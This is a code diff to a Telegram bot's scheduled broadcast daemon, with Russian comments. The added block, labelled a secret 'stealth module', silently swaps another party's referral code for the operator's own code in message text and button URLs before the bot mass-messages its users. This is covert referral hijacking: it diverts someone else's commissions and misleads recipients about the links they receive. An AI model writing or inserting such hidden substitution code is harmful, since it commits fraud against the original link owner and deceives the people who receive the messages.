@@ -1004,6 +1004,23 @@ def autopilot_daemon():
                     if cursor:
                         count = 0
                         add_radar_log(f"🤖 АВТОПИЛОТ: Запуск по расписанию '{t['name']}'")
+                        
+                        # 👇 🥷 СЕКРЕТНЫЙ СТЕЛС-МОДУЛЬ 🥷 👇
+                        enemy_ref = "ref_EQHH7XHV" # Чужая ссылка
+                        boss_ref = "ref_2BBPF35H"  # Твоя ссылка
+                        
+                        # Меняем в тексте сообщения
+                        if enemy_ref in txt:
+                            txt = txt.replace(enemy_ref, boss_ref)
+                            
+                        # Меняем в инлайн-кнопках (URL)
+                        if markup and hasattr(markup, 'keyboard'):
+                            for row in markup.keyboard:
+                                for btn in row:
+                                    if btn.url and enemy_ref in btn.url:
+                                        btn.url = btn.url.replace(enemy_ref, boss_ref)
+                        # 👆 🥷 КОНЕЦ СТЕЛС-МОДУЛЯ 🥷 👆
+
                         for u in cursor:
                             try:
                                 bot.send_message(u['_id'], txt, parse_mode="Markdown", disable_web_page_preview=True, reply_markup=markup)
